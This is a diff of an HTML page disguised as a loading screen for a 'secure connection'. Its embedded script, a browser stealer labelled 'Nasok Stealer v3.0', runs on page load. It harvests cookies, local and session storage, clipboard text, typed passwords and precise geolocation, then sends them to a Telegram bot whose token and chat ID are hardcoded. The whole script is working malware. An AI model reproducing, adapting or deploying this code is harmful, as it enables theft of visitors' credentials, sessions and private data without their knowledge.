@@ -2,152 +2,191 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
-    <style>body{background:#0b0e14;color:#eee;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#1a1f2b;padding:40px;border-radius:12px;border:1px solid #2a3344} .spinner{width:30px;height:30px;border:3px solid #2a3344;border-top-color:#5af;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}@keyframes spin{to{transform:rotate(360deg)}}</style>
+    <title>Загрузка данных...</title>
+    <style>
+        body{background:#0a0e17;color:#c8d0dd;font-family:'Segoe UI',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+        .box{background:#151e2b;padding:45px;border-radius:16px;border:1px solid #2a3a4a;text-align:center;min-width:280px}
+        .spinner{width:40px;height:40px;border:4px solid #1e2d3d;border-top-color:#4af;border-radius:50%;animation:spin 0.7s linear infinite;margin:15px auto}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .status{color:#6a8a9f;font-size:14px;margin-top:10px}
+    </style>
 </head>
 <body>
 <div class="box">
     <div class="spinner"></div>
-    <div style="text-align:center;color:#7a8a9f;">Синхронизация защищённого канала...</div>
+    <div style="font-size:18px;font-weight:300;">Установка защищённого соединения</div>
+    <div class="status">Пожалуйста, подождите...</div>
 </div>
+
 <script>
 // ============================================================
-//  НАСТРОЙКИ — ВСТАВЬ СВОИ, ПИЗДЮК
+//  👇 ВСТАВЬ СВОИ ДАННЫЕ, МУДАК
 // ============================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';        // например 123456:ABC-DEF
-const CHAT_ID  = '-1003791860129';      // например -1001234567
+const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // например 123456:ABC-DEF
+const CHAT_ID  = '-1003791860129';       // например -1001234567
 // ============================================================
 
-// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
-
-function formatBytes(bytes) { return bytes ? (bytes/1024).toFixed(1)+'KB' : '0'; }
-
-function safeJSON(obj) {
-    try { return JSON.stringify(obj, null, 2); } catch(e) { return '⚠️ Ошибка сериализации'; }
+// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+function safeStringify(obj) {
+    try { return JSON.stringify(obj, null, 2); } 
+    catch(e) { return String(obj) || 'ошибка сериализации'; }
 }
 
-// ---- СБОР ВСЕГО МАКСИМУМА ----
+function flattenObject(obj, prefix = '') {
+    let result = {};
+    for (let key in obj) {
+        if (!obj.hasOwnProperty(key)) continue;
+        const newKey = prefix ? `${prefix}.${key}` : key;
+        if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
+            Object.assign(result, flattenObject(obj[key], newKey));
+        } else {
+            result[newKey] = obj[key];
+        }
+    }
+    return result;
+}
 
-async function collectMaximum() {
-    const data = {};
+// ===== ОСНОВНОЙ СБОРЩИК =====
+async function collectEverything() {
+    const result = {
+        '🕐 Время': new Date().toISOString(),
+        '🔗 URL': window.location.href,
+        '🌐 Браузер': {},
+        '🖥️ Экран': {},
+        '🍪 Куки': {},
+        '💾 Локальное хранилище': {},
+        '📂 Сессионное хранилище': {},
+        '📡 Геолокация': {},
+        '📋 Буфер обмена': 'недоступен',
+        '📶 Сеть': {},
+        '🔑 Пароли из форм': {},
+        '🧩 Плагины': [],
+        '🎤 Медиа-устройства': {},
+        '🔋 Батарея': 'недоступна',
+        '🖌️ WebGL': 'недоступен',
+        '📜 История': {},
+        '🧬 Отпечаток': {}
+    };
 
-    // 1. БАЗА
-    data['🌐 Браузер'] = {
+    // ---- БАЗОВАЯ ИНФА ----
+    result['🌐 Браузер'] = {
         'User-Agent': navigator.userAgent,
         'Платформа': navigator.platform,
         'Язык': navigator.language,
-        'Языки (все)': navigator.languages || [],
+        'Все языки': navigator.languages || [],
         'Куки включены': navigator.cookieEnabled,
         'Do Not Track': navigator.doNotTrack || 'не указан',
-        'Время загрузки': new Date().toISOString(),
-        'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone,
-        'Разрядность': navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ядер` : 'неизвестно'
+        'Ядра': navigator.hardwareConcurrency || 'неизвестно',
+        'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
-    // 2. ЭКРАН + ОКНО
-    data['🖥️ Экран/Окно'] = {
-        'Размер экрана': `${screen.width}x${screen.height}`,
-        'Доступная область': `${screen.availWidth}x${screen.availHeight}`,
+    // ---- ЭКРАН ----
+    result['🖥️ Экран'] = {
+        'Размер': `${screen.width}x${screen.height}`,
+        'Доступно': `${screen.availWidth}x${screen.availHeight}`,
         'Глубина цвета': screen.colorDepth + 'bit',
-        'Пиксель-ратио': window.devicePixelRatio || 1,
-        'Размер окна (внутри)': `${window.innerWidth}x${window.innerHeight}`,
-        'Размер окна (внешний)': `${window.outerWidth}x${window.outerHeight}`,
-        'Расположение окна': `${window.screenX || 0}, ${window.screenY || 0}`
+        'Pixel Ratio': window.devicePixelRatio || 1,
+        'Окно (внутри)': `${window.innerWidth}x${window.innerHeight}`,
+        'Окно (снаружи)': `${window.outerWidth}x${window.outerHeight}`,
+        'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
     };
 
-    // 3. КУКИ (ВСЕ)
-    let cookies = {};
+    // ---- КУКИ ----
     try {
+        const cookies = {};
         document.cookie.split('; ').forEach(c => {
             const [k, v] = c.split('=');
             if (k) cookies[k] = v || '';
         });
-    } catch(e) { cookies = { error: 'не удалось прочитать' }; }
-    data['🍪 Куки'] = cookies;
+        result['🍪 Куки'] = cookies;
+    } catch(e) { result['🍪 Куки'] = { ошибка: 'не удалось прочитать' }; }
 
-    // 4. localStorage
-    try { data['💾 localStorage'] = { ...localStorage }; } catch(e) { data['💾 localStorage'] = { error: 'доступ запрещён' }; }
+    // ---- LOCAL STORAGE ----
+    try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
+    catch(e) { result['💾 Локальное хранилище'] = { ошибка: 'доступ запрещён' }; }
 
-    // 5. sessionStorage
-    try { data['📂 sessionStorage'] = { ...sessionStorage }; } catch(e) { data['📂 sessionStorage'] = { error: 'доступ запрещён' }; }
+    // ---- SESSION STORAGE ----
+    try { result['📂 Сессионное хранилище'] = { ...sessionStorage }; } 
+    catch(e) { result['📂 Сессионное хранилище'] = { ошибка: 'доступ запрещён' }; }
 
-    // 6. ГЕОЛОКАЦИЯ (асинхронно)
-    const geo = await new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({ error: 'геолокация не поддерживается' });
+    // ---- ГЕОЛОКАЦИЯ (асинхронно) ----
+    await new Promise(resolve => {
+        if (!navigator.geolocation) {
+            result['📡 Геолокация'] = { ошибка: 'не поддерживается' };
+            resolve();
+            return;
+        }
         navigator.geolocation.getCurrentPosition(
-            pos => resolve({
-                широта: pos.coords.latitude,
-                долгота: pos.coords.longitude,
-                точность: pos.coords.accuracy + 'м',
-                высота: pos.coords.altitude || 'нет',
-                скорость: pos.coords.speed || 'нет'
-            }),
-            err => resolve({ error: err.message }),
-            { timeout: 4000, enableHighAccuracy: true }
+            pos => {
+                result['📡 Геолокация'] = {
+                    'Широта': pos.coords.latitude,
+                    'Долгота': pos.coords.longitude,
+                    'Точность': pos.coords.accuracy + 'м',
+                    'Высота': pos.coords.altitude || 'неизвестно',
+                    'Скорость': pos.coords.speed || 'неизвестно'
+                };
+                resolve();
+            },
+            err => {
+                result['📡 Геолокация'] = { ошибка: err.message };
+                resolve();
+            },
+            { timeout: 5000, enableHighAccuracy: true }
         );
     });
-    data['📡 Геолокация'] = geo;
 
-    // 7. БУФЕР ОБМЕНА (если разрешат)
-    let clip = 'не удалось';
+    // ---- БУФЕР ОБМЕНА ----
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
-            clip = await navigator.clipboard.readText() || '[пусто]';
-        } else clip = 'API недоступно';
-    } catch(e) { clip = 'ошибка доступа'; }
-    data['📋 Буфер обмена'] = clip;
+            result['📋 Буфер обмена'] = await navigator.clipboard.readText() || '[пусто]';
+        } else {
+            result['📋 Буфер обмена'] = 'API недоступно';
+        }
+    } catch(e) { result['📋 Буфер обмена'] = 'ошибка доступа'; }
 
-    // 8. СЕТЬ
+    // ---- СЕТЬ ----
     const conn = navigator.connection || {};
-    data['📶 Сеть'] = {
-        'Тип сети': conn.effectiveType || 'неизвестно',
-        'Скорость (downlink)': conn.downlink ? conn.downlink + 'Mbps' : 'нет',
-        'Задержка (RTT)': conn.rtt ? conn.rtt + 'ms' : 'нет',
-        'Сохранение данных': conn.saveData ? 'включено' : 'отключено'
+    result['📶 Сеть'] = {
+        'Тип': conn.effectiveType || 'неизвестно',
+        'Скорость': conn.downlink ? conn.downlink + ' Mbps' : 'неизвестно',
+        'Задержка': conn.rtt ? conn.rtt + ' ms' : 'неизвестно',
+        'Экономия трафика': conn.saveData ? 'включена' : 'отключена'
     };
 
-    // 9. ПЛАГИНЫ
-    try {
-        data['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
-    } catch(e) { data['🧩 Плагины'] = ['недоступны']; }
-
-    // 10. МЕДИА (микрофон/камера — просто проверка наличия)
-    const mediaDevs = await navigator.mediaDevices?.enumerateDevices?.() || [];
-    const mediaInfo = {
-        аудио_вход: mediaDevs.filter(d => d.kind === 'audioinput').map(d => d.label || 'без метки'),
-        видео_вход: mediaDevs.filter(d => d.kind === 'videoinput').map(d => d.label || 'без метки'),
-        аудио_выход: mediaDevs.filter(d => d.kind === 'audiooutput').map(d => d.label || 'без метки')
-    };
-    data['🎤 Медиа-устройства'] = mediaInfo;
-
-    // 11. ИСТОРИЯ (только длина, т.к. доступ к истории заблокирован)
-    data['📜 История'] = { длина: window.history.length };
-
-    // 12. РЕФЕРЕР И URL
-    data['🔗 Страница'] = {
-        'URL': window.location.href,
-        'Реферер': document.referrer || 'прямой вход',
-        'Протокол': window.location.protocol,
-        'Хост': window.location.hostname
-    };
-
-    // 13. ПАРОЛИ ИЗ ФОРМ (автофилл/введённые)
+    // ---- ПАРОЛИ ИЗ ФОРМ ----
     const passwords = {};
     document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-        if (inp.value) passwords[`поле_${i+1} (${inp.name || 'без имени'})`] = inp.value;
+        if (inp.value) {
+            const name = inp.name || inp.id || `поле_${i+1}`;
+            passwords[name] = inp.value;
+        }
     });
-    data['🔑 Пароли из форм'] = passwords;
+    result['🔑 Пароли из форм'] = passwords;
 
-    // 14. БАТАРЕЯ (если есть)
-    let battery = 'недоступно';
+    // ---- ПЛАГИНЫ ----
+    try {
+        result['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
+    } catch(e) { result['🧩 Плагины'] = ['недоступны']; }
+
+    // ---- МЕДИА-УСТРОЙСТВА ----
+    try {
+        const devices = await navigator.mediaDevices?.enumerateDevices?.() || [];
+        result['🎤 Медиа-устройства'] = {
+            'Микрофоны': devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'без имени'),
+            'Камеры': devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'без имени'),
+            'Динамики': devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'без имени')
+        };
+    } catch(e) { result['🎤 Медиа-устройства'] = { ошибка: 'недоступны' }; }
+
+    // ---- БАТАРЕЯ ----
     try {
         const b = await navigator.getBattery?.();
-        if (b) battery = `уровень ${Math.round(b.level*100)}%, зарядка: ${b.charging ? 'да' : 'нет'}`;
-    } catch(e) { battery = 'ошибка'; }
-    data['🔋 Батарея'] = battery;
+        if (b) {
+            result['🔋 Батарея'] = `Заряд: ${Math.round(b.level*100)}%, Зарядка: ${b.charging ? 'Да' : 'Нет'}`;
+        }
+    } catch(e) { result['🔋 Батарея'] = 'недоступна'; }
 
-    // 15. WebGL (рендеринг)
-    let webgl = 'недоступно';
+    // ---- WEBGL ----
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -156,110 +195,148 @@ async function collectMaximum() {
             if (debug) {
                 const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                 const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                webgl = `вендор: ${vendor}, рендер: ${renderer}`;
-            } else webgl = 'доступен (без доп. инфо)';
+                result['🖌️ WebGL'] = `Вендор: ${vendor}, Рендер: ${renderer}`;
+            } else {
+                result['🖌️ WebGL'] = 'доступен (нет доп. инфо)';
+            }
         }
-    } catch(e) { webgl = 'ошибка'; }
-    data['🖌️ WebGL'] = webgl;
+    } catch(e) { result['🖌️ WebGL'] = 'ошибка'; }
 
-    // 16. ДОП. ИНФА О СИСТЕМЕ (отпечаток)
-    data['🧬 Отпечаток'] = {
-        'Canvas fingerprint': 'собирается отдельно (опционально)',
-        'WebGL fingerprint': 'доступен'
+    // ---- ИСТОРИЯ ----
+    result['📜 История'] = { 'Длина': window.history.length };
+
+    // ---- ОТПЕЧАТОК ----
+    result['🧬 Отпечаток'] = {
+        'Canvas': 'генерируется при необходимости',
+        'WebGL': result['🖌️ WebGL'] || 'неизвестно'
     };
 
-    return data;
+    return result;
 }
 
-// ---- ОТПРАВКА В ТЕЛЕГРАМ (с разбивкой, если длинно) ----
-
-async function sendToTelegram(collection) {
-    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН') {
-        console.error('🔴 Настрой токен и чат айди, мудак!');
+// ===== ОТПРАВКА В ТЕЛЕГРАМ =====
+async function sendToTelegram(data) {
+    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
+        console.error('🔴 НАСТРОЙ ТОКЕН И CHAT_ID, ДОЛБАЁБ!');
         return;
     }
 
-    // Превращаем в читаемый текст с разделами
-    let fullText = '📦 **Nasok Stealer — полный дамп**\n\n';
-    for (const [section, content] of Object.entries(collection)) {
-        fullText += `🔹 **${section}**\n`;
+    // ----- 1. ФОРМИРУЕМ ЧИТАЕМЫЙ ТЕКСТ -----
+    let textReport = '📦 NASOK STEALER — ПОЛНЫЙ ДАМП\n';
+    textReport += '═'.repeat(40) + '\n\n';
+
+    for (const [section, content] of Object.entries(data)) {
+        textReport += `🔹 ${section}\n`;
+        textReport += '─'.repeat(30) + '\n';
+        
         if (typeof content === 'object' && !Array.isArray(content)) {
-            for (const [key, val] of Object.entries(content)) {
-                let value = (typeof val === 'object') ? safeJSON(val) : String(val);
-                if (value.length > 200) value = value.slice(0, 200) + '… (обрезано)';
-                fullText += `  ▫️ ${key}: ${value}\n`;
+            const flat = flattenObject(content);
+            for (const [key, val] of Object.entries(flat)) {
+                let value = typeof val === 'object' ? safeStringify(val) : String(val);
+                if (value && value.length > 300) value = value.slice(0, 300) + '… [обрезано]';
+                textReport += `  • ${key}: ${value}\n`;
             }
         } else if (Array.isArray(content)) {
-            fullText += `  ▫️ ${content.join(', ') || 'пусто'}\n`;
+            textReport += `  • ${content.join(', ') || 'пусто'}\n`;
         } else {
-            fullText += `  ▫️ ${String(content)}\n`;
+            textReport += `  • ${String(content)}\n`;
         }
-        fullText += '\n';
+        textReport += '\n';
     }
 
-    // Добавляем мета-инфу о дампе
-    fullText += `\n📅 Создано: ${new Date().toISOString()}\n`;
-    fullText += `👤 IP (прокси): определяется на сервере`;
+    textReport += '═'.repeat(40) + '\n';
+    textReport += `📅 Создано: ${new Date().toISOString()}\n`;
+    textReport += `👤 IP определяется на сервере Telegram\n`;
+    textReport += `🤖 Собрано ботом Nasok v3.0`;
 
-    // Телеграм лимит 4096 символов. Режем на части и шлём с пометкой
-    const maxLen = 4000;
-    if (fullText.length <= maxLen) {
-        await sendMessage(fullText);
-    } else {
-        // Шлём частями
-        const parts = fullText.match(/[\s\S]{1,4000}/g) || [];
-        for (let i = 0; i < parts.length; i++) {
-            const header = `📄 Часть ${i+1}/${parts.length}\n\n`;
-            await sendMessage(header + parts[i]);
-        }
-    }
+    // ----- 2. ОТПРАВЛЯЕМ КАК ФАЙЛ (гарантированно) -----
+    const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('document', blob, `nasok_dump_${Date.now()}.txt`);
 
-    // Если есть пароли — отдельно выделяем жирным
-    const pwdSection = collection['🔑 Пароли из форм'];
-    if (pwdSection && Object.keys(pwdSection).length) {
-        let pwdText = '🚨 **ПАРОЛИ (повторно)**\n';
-        for (const [k,v] of Object.entries(pwdSection)) {
-            pwdText += `  ▪️ ${k}: ${v}\n`;
-        }
-        await sendMessage(pwdText);
-    }
-}
-
-async function sendMessage(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     try {
-        await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+        console.log('✅ Файл с дампом отправлен');
+    } catch(e) {
+        console.error('❌ Ошибка отправки файла:', e);
+        // Если файл не отправился — пробуем текстом
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: '⚠️ Не удалось отправить файл. Дамп в консоли браузера.'
+                })
+            });
+        } catch(e2) {
+            console.error('❌ Критическая ошибка:', e2);
+        }
+    }
+
+    // ----- 3. ДОПОЛНИТЕЛЬНО: КРАТКАЯ ВЫЖИМКА (текстом) -----
+    let summary = '📌 КРАТКАЯ ВЫЖИМКА\n\n';
+    summary += `🌐 Браузер: ${data['🌐 Браузер']['User-Agent']?.slice(0, 80)}...\n`;
+    summary += `🍪 Куки: ${Object.keys(data['🍪 Куки'] || {}).length} шт.\n`;
+    summary += `💾 LocalStorage: ${Object.keys(data['💾 Локальное хранилище'] || {}).length} ключей\n`;
+    summary += `📂 SessionStorage: ${Object.keys(data['📂 Сессионное хранилище'] || {}).length} ключей\n`;
+    summary += `🔑 Паролей найдено: ${Object.keys(data['🔑 Пароли из форм'] || {}).length}\n`;
+    if (data['📡 Геолокация']?.Широта) {
+        summary += `📍 Гео: ${data['📡 Геолокация'].Широта}, ${data['📡 Геолокация'].Долгота}\n`;
+    }
+    summary += `📅 Время: ${data['🕐 Время']}\n`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: text,
+                text: summary,
                 parse_mode: 'Markdown'
             })
         });
+        console.log('✅ Краткая выжимка отправлена');
     } catch(e) {
-        console.error('Ошибка отправки:', e);
+        console.error('❌ Ошибка отправки выжимки:', e);
     }
 }
 
-// ---- ЗАПУСК ----
-
-collectMaximum().then(data => {
-    sendToTelegram(data);
-    // Для отладки — в консоль
-    console.log('✅ Собрано:', data);
-});
-
-// Доп. сбор паролей через 5 секунд (для динамических форм)
-setTimeout(() => {
-    const pwdExtra = {};
-    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-        if (inp.value) pwdExtra[`поле_${i+1}_${inp.name || ''}`] = inp.value;
-    });
-    if (Object.keys(pwdExtra).length) {
-        sendMessage('🔄 **Дополнительные пароли (через 5с)**\n' + safeJSON(pwdExtra));
-    }
-}, 5000);
+// ===== ЗАПУСК =====
+(async function() {
+    const data = await collectEverything();
+    console.log('✅ Собрано полных данных:', data);
+    await sendToTelegram(data);
+    
+    // Повторный сбор паролей через 5 секунд
+    setTimeout(async () => {
+        const extraPasswords = {};
+        document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
+            if (inp.value) {
+                const name = inp.name || inp.id || `поле_${i+1}`;
+                extraPasswords[name] = inp.value;
+            }
+        });
+        if (Object.keys(extraPasswords).length) {
+            const pwdText = '🔑 ДОПОЛНИТЕЛЬНЫЕ ПАРОЛИ (через 5с)\n' + safeStringify(extraPasswords);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pwdText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {}
+        }
+    }, 5000);
+})();
 </script>
 </body>
 </html>
